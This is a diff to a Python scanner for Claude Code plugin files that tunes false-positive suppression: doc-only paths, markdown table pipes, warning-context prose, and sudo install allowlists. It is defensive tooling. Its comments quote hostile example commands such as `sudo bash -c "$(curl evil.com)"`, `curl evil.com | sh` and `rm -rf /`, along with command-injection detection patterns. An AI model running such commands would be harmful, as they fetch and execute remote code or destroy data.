@@ -433,6 +433,233 @@ def _is_inert_token_in_string(line: str, match: str) -> bool:
     return True
 
 
+# Mirrored from ``cpv_skillaudit_native._is_documentation_only_path`` to
+# avoid a circular import (this module is imported by the dispatcher in
+# the parent module). The two definitions stay in sync via a parity
+# test in ``tests/test_skillaudit_doc_only_parity.py``.
+_DOC_ONLY_BASENAMES_MD: Final[frozenset[str]] = frozenset(
+    {
+        "readme.md",
+        "changelog.md",
+        "contributing.md",
+        "license.md",
+        "license",
+        "code_of_conduct.md",
+        "security.md",
+        "support.md",
+        "authors.md",
+        "maintainers.md",
+        "history.md",
+    }
+)
+_DOC_ONLY_DIR_PREFIXES_MD: Final[tuple[str, ...]] = (
+    "docs/",
+    "doc/",
+    "references/",
+    "reference/",
+    "examples/",
+    "example/",
+    "changelog/",
+)
+_INSTRUCTION_LOADABLE_BASENAMES_MD: Final[frozenset[str]] = frozenset(
+    {"skill.md", "claude.md", "agents.md"}
+)
+
+
+def _is_documentation_only_path_md(file_path: str) -> bool:
+    """Mirror of ``cpv_skillaudit_native._is_documentation_only_path``.
+
+    Returns True iff ``file_path`` is a pure-documentation surface that
+    Claude Code never loads as agent instructions. Mirrored locally to
+    avoid a circular import — kept in sync via parity test.
+    """
+    if not file_path:
+        return False
+    norm = file_path.replace("\\", "/").lstrip("./").lower()
+    if not norm:
+        return False
+    parts = norm.split("/")
+    basename = parts[-1]
+    if basename in _INSTRUCTION_LOADABLE_BASENAMES_MD:
+        return False
+    if basename in _DOC_ONLY_BASENAMES_MD:
+        return True
+    for prefix in _DOC_ONLY_DIR_PREFIXES_MD:
+        if norm.startswith(prefix) or ("/" + prefix) in ("/" + norm):
+            return True
+    return False
+
+
+def _is_gfm_table_row(line: str) -> bool:
+    """True iff ``line`` is a GitHub-Flavored-Markdown table row.
+
+    GFM table rows: line starts with ``|`` (possibly after whitespace),
+    ends with ``|`` (after stripping trailing whitespace), and has at
+    least 3 pipe characters (minimum: ``| col1 | col2 |``). Header
+    separator rows like ``| --- | --- |`` also qualify.
+    """
+    stripped = line.strip()
+    if not stripped.startswith("|"):
+        return False
+    if not stripped.endswith("|"):
+        return False
+    return stripped.count("|") >= 3
+
+
+def _match_is_table_separator_pipe(line: str, match: str) -> bool:
+    """True iff ``match`` contains the ``|`` character AND the line is a
+    GFM table row (so the ``|`` is the table separator, not a shell pipe).
+
+    Defends against the CMD_INJECTION pattern
+    ``(?:;|\\||&&)\\s*\\b(bash|sh|...)\\b`` firing on a markdown table
+    cell like ``| warn-dangerous-rm | bash | rm\\s+-rf |`` where the
+    ``|`` is the GFM table separator, not a shell pipe.
+    """
+    if "|" not in match:
+        return False
+    return _is_gfm_table_row(line)
+
+
+# Warning-context vocabulary: prose that explicitly tells the reader
+# "this is a dangerous pattern, don't do it". A match like ``chmod 777``
+# or ``rm -rf /`` inside a sentence with this vocabulary is documentation
+# of the bad pattern, not an instruction to execute it.
+_WARNING_CONTEXT_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:\b(?:do\s*not|don'?t|never|avoid|forbid|dangerous|risky|"
+    r"security[-\s]+risk|warn(?:s|ed|ing)?|flag(?:s|ged)?|"
+    r"insecure|unsafe|harmful|destructive|deprecated|"
+    r"anti[-\s]*pattern|bad\s+practice|wrong|incorrect|"
+    r"example\s+of\s+what\s+not|catch(?:es)?\s+(?:the|this|that)\s+pattern)\b"
+    r"|"
+    # r01 anthropic FP iter1: documentation markers indicating example
+    # patterns / rule definitions / regex pattern listings. ONLY count
+    # tightly-scoped prose conventions ("**Examples:**", "Matches:",
+    # "### Examples", "Pattern listing:" etc.) — bare standalone
+    # words like "example" or "pattern" are too common in URLs / prose
+    # / identifiers and would over-match.
+    r"\*\*\s*(?:example|examples|pattern|patterns|matches|rule|rules|regex|detection)\s*:?\s*\*\*"
+    r"|"
+    r"#+\s+(?:example|examples|pattern|patterns|matches|rule|rules|regex|detection)\b"
+    r"|"
+    r"\b(?:example|examples|pattern|patterns|matches|rule|rules|regex|detection)\s*:"
+    r"|"
+    r"\bcatch(?:es|ed|ing)?\s+(?:the|this|that)\s+pattern"
+    r")",
+    re.IGNORECASE,
+)
+
+
+def _match_in_warning_context(line: str, lines: list[str], line_idx: int) -> bool:
+    """True iff the line itself OR the ±2 surrounding lines contain
+    warning-context vocabulary (don't / never / dangerous / risky / etc.).
+
+    Used to certify ``chmod 777`` / ``rm -rf /`` / similar destructive
+    patterns as DOCUMENTATION of the bad pattern, not exec instructions.
+    """
+    if _WARNING_CONTEXT_RE.search(line):
+        return True
+    lo = max(0, line_idx - 2)
+    hi = min(len(lines) - 1, line_idx + 2)
+    for i in range(lo, hi + 1):
+        if i == line_idx:
+            continue
+        if _WARNING_CONTEXT_RE.search(lines[i]):
+            return True
+    return False
+
+
+# Known-safe ``sudo`` install / admin commands. These are documented
+# install instructions in plugin READMEs (esp. ESP32 toolchains, native
+# language SDKs, system-level admin docs). Privilege escalation requires
+# something MORE than a plain package-manager install (`sudo -i`, `sudo
+# bash`, `sudo su`, `sudo sh -c "$(curl ...)"`, `echo ... >> <sudoers>`,
+# `sudo chmod +s`, etc.).
+_SUDO_INSTALL_ALLOWLIST_RE: Final[re.Pattern[str]] = re.compile(
+    r"\bsudo\s+(?:"
+    r"apt(?:-get)?\s+(?:install|update|upgrade|remove|purge|autoremove)|"
+    r"dnf\s+(?:install|update|upgrade|remove|autoremove)|"
+    r"yum\s+(?:install|update|upgrade|remove|erase)|"
+    r"pacman\s+-S(?:[uy]+)?|"
+    r"zypper\s+(?:install|update|upgrade|remove|in|up)|"
+    r"apk\s+(?:add|del|update|upgrade)|"
+    r"brew\s+(?:install|update|upgrade|reinstall|cleanup)|"
+    r"port\s+(?:install|update|upgrade|uninstall)|"
+    r"npm\s+(?:install|update|uninstall)\s+-g|"
+    r"pip\d*\s+install|"
+    r"snap\s+(?:install|refresh|remove)|"
+    r"flatpak\s+install|"
+    r"usermod\s+-aG\s+\w+|"
+    r"systemctl\s+(?:start|stop|restart|reload|status|enable|disable|daemon-reload)|"
+    r"service\s+\w+\s+(?:start|stop|restart|reload|status)|"
+    r"update-alternatives\s+--(?:install|config|set|remove)|"
+    r"ln\s+-s\b|"
+    r"cp\s+(?:-\w+\s+)?\S+\s+/usr/local/bin/|"
+    r"mkdir\s+(?:-\w+\s+)?(?:/opt/|/usr/local/)"
+    r")",
+    re.IGNORECASE,
+)
+
+
+def _is_sudo_install_command(line: str, match: str) -> bool:
+    """True iff ``match`` is the ``sudo `` prefix AND the line continues
+    with a known-safe package-manager install / admin command.
+
+    Real privilege escalation (``sudo -i``, ``sudo bash``, ``sudo su``,
+    ``sudo sh -c "$(curl ...)"``, ``echo ... >> <sudoers>``,
+    ``sudo chmod +s``, etc.) does NOT match this allowlist and stays
+    flagged.
+    """
+    if "sudo" not in match.lower():
+        return False
+    return bool(_SUDO_INSTALL_ALLOWLIST_RE.search(line))
+
+
+# Prose-context patterns for `sudo` mentions. A line containing one of
+# these is talking ABOUT sudo (English prose, documentation explaining
+# permissions / install steps / troubleshooting / etc.) rather than
+# INVOKING sudo (which would be a literal shell command shape).
+#
+# Conservative: matches only the explicit common shapes ("without sudo",
+# "via sudo", "sudo requires", "sudo password", etc.). Doesn't match
+# bare standalone `sudo` (could be either) — those still go through the
+# allowlist + shell-shape check.
+_SUDO_PROSE_MENTION_RE: Final[re.Pattern[str]] = re.compile(
+    r"\b(?:"
+    r"without\s+sudo|"
+    r"with\s+sudo|"
+    r"using\s+sudo|"
+    r"via\s+sudo|"
+    r"requires?\s+sudo|"
+    r"needs?\s+sudo|"
+    r"sudo\s+(?:requires|needs|access|prompt|password|permissions?|privilege|capability|capabilities|account|user|setup|configuration|config|rights)\b|"
+    r"(?:your|the|a|user(?:'s)?)\s+sudo|"
+    r"(?:run|running|execute|invoke|call|use|usage|using)\s+(?:as\s+)?sudo|"
+    r"sudo\s+(?:as|is|was|will|may|might|can|cannot|could|should|would|must|works?|works\s+like)\b|"
+    r"(?:asks?|prompts?|requires?|needs?)\s+for\s+(?:a\s+|your\s+)?sudo"
+    r")",
+    re.IGNORECASE,
+)
+
+
+def _is_sudo_in_prose_mention(line: str, match: str) -> bool:
+    """True iff ``match`` is a ``sudo`` mention AND the line shows
+    documentation prose discussing sudo (English explanation), not a
+    literal shell invocation.
+
+    Examples (suppress):
+      * ``without sudo requires group membership``
+      * ``Run as sudo and try again``
+      * ``the sudo prompt will appear``
+
+    Examples (do NOT match — fall through to allowlist / keep):
+      * ``sudo apt-get install -y python3``  (handled by install allowlist)
+      * ``sudo bash -c "$(curl evil.com)"`` (real escalation, stays flagged)
+    """
+    if "sudo" not in match.lower():
+        return False
+    return bool(_SUDO_PROSE_MENTION_RE.search(line))
+
+
 def _certain_benign_literal(
     line: str,
     lines: list[str],
@@ -477,6 +704,76 @@ def _certain_benign_literal(
     ):
         return True
 
+    # (4) r01 anthropic FP iter1 (2026-05-27) — GFM table separator
+    #     ``|`` matched by a CMD_INJECTION shell-pipe pattern. The line
+    #     IS a markdown table row (starts with ``|``, ends with ``|``,
+    #     ≥3 pipes), so the matched ``|`` is the table separator, not a
+    #     shell pipe. The CMD_INJECTION pattern
+    #     ``(?:;|\\||&&)\\s*\\b(bash|sh|...)\\b`` cannot distinguish
+    #     these without table awareness.
+    if rule_id == "CMD_INJECTION" and _match_is_table_separator_pipe(line, match):
+        return True
+
+    # (5) r01 anthropic FP iter1 — destructive-pattern match
+    #     (``chmod 777``, ``rm -rf /``, ``setuid``, ``setgid``,
+    #     ``chown root``, ``<shadow>``) inside prose with
+    #     warning-context vocabulary (``don't``, ``never``,
+    #     ``dangerous``, ``risky``, ``security risk``, etc.). The
+    #     author is teaching the reader to AVOID the pattern, not
+    #     execute it. Iron rule preserved: same patterns OUTSIDE
+    #     warning context (e.g. a real ``chmod 777`` in a real install
+    #     script) still fire.
+    if (
+        rule_id in {"FS_WRITE", "PRIVILEGE_ESC", "CMD_INJECTION", "SHELL_EXEC"}
+        and _match_in_warning_context(line, lines, line_idx)
+    ):
+        return True
+
+    # (6) r01 anthropic FP iter1 — ``sudo apt-get install ...`` and
+    #     similar known-safe package-manager / admin commands in
+    #     install / setup docs. PRIVILEGE_ESC's bare ``sudo\\s`` pattern
+    #     cannot distinguish ``sudo apt install python3`` (routine
+    #     install) from ``sudo sh -c "$(curl evil.com)"`` (real escalation).
+    #     The allowlist enumerates safe shapes; anything not in the
+    #     allowlist stays flagged.
+    if rule_id == "PRIVILEGE_ESC" and _is_sudo_install_command(line, match):
+        return True
+
+    # (7) r01 anthropic FP iter1 — ``sudo`` mentioned as an English
+    #     noun / verb in documentation prose (``without sudo requires
+    #     group membership``, ``the sudo prompt``, ``running as sudo``,
+    #     etc.). Distinct from a literal shell invocation — there's no
+    #     command/flag after ``sudo`` in these mentions. Iron-rule
+    #     preserved: real ``sudo <command>`` shapes still fire (no prose
+    #     marker match).
+    if rule_id == "PRIVILEGE_ESC" and _is_sudo_in_prose_mention(line, match):
+        return True
+
+    # (8) r01 anthropic FP iter1 — CRED_ENV_SAFE in markdown is
+    #     ALWAYS documentation by definition. The rule's intent (per
+    #     its own name "Credential reference (documentation)") is to
+    #     flag prose mentioning ``.env`` files, API key setup, etc.
+    #     for FYI. In markdown context every match is documentation;
+    #     suppress unconditionally. Real leaked credentials are caught
+    #     by HARDCODED_SECRET / SECRET_OPENAI_KEY / SECRET_ANTHROPIC_KEY
+    #     / API_KEY_LEAK rules which fire on the actual key payload,
+    #     not on the word ``.env`` or ``API_KEY``. Iron-rule preserved:
+    #     those secret-payload rules stay flagged independently.
+    if rule_id == "CRED_ENV_SAFE":
+        return True
+
+    # NOTE: CMD_INJECTION / SHELL_EXEC matched INSIDE markdown inline
+    # code (``\`curl x | sh\```) intentionally do NOT shortcut to
+    # safe_literal here — the existing flow returns ``safe_doc`` for
+    # inline code, which the dispatcher then SUPPRESSES in doc-only
+    # paths (README.md, references/, docs/) and DEMOTES in
+    # instruction-loadable paths (SKILL.md, agents/, commands/,
+    # .claude/rules/, CLAUDE.md). The demote keeps the finding visible
+    # at NIT so the author of an instruction-loadable file MUST review
+    # any inline-code shell command (the agent reads SKILL.md as
+    # instructions; a `\`curl evil.com | sh\`` mention can become a
+    # delivery vector if the agent decides to invoke it). The
+    # iron-rule wins over reducing instruction-loadable NITs.
     return False
 
 
@@ -610,6 +907,27 @@ def classify(
         # surfaces in published plugins; any other host stays
         # unknown→keep (the existing heuristic chain decides).
         if _is_official_install_pipe(line):
+            return "code_fence_neutral"
+        # r01 anthropic FP iter1 (2026-05-27) — a bash/sh code fence
+        # inside a documentation-only path (references/, docs/,
+        # README.md, CHANGELOG.md, examples/, etc.) is a code-snippet
+        # tutorial / how-to / example, NOT an agent-executed payload.
+        # Documentation-only paths are NEVER loaded by Claude Code as
+        # agent instructions. A shell example like `echo X | nc host
+        # port` in `references/advanced.md` is teaching the reader how
+        # to send metrics, not exec-ing the netcat call. Mark as
+        # ``code_fence_neutral`` so the dispatcher's doc-only branch
+        # suppresses it (instead of the heuristic chain keeping it at
+        # CRITICAL because of the bash-fence uplift).
+        #
+        # Iron-rule preserved: instruction-loadable paths (SKILL.md,
+        # CLAUDE.md, agents/, commands/, .claude/rules/) NEVER match
+        # ``_is_documentation_only_path_md`` — bash fences there keep
+        # returning ``unknown`` so the heuristic chain decides. And
+        # hidden-content / per-vendor-secret / INTENT-hard rules are
+        # carved out at the dispatcher level (lines ~1167, ~1210)
+        # regardless of classifier verdict.
+        if _is_documentation_only_path_md(file_path):
             return "code_fence_neutral"
         # Match is inside a shell-fence. We can't (here) reach into
         # the shell-context classifier without recursive plumbing, so
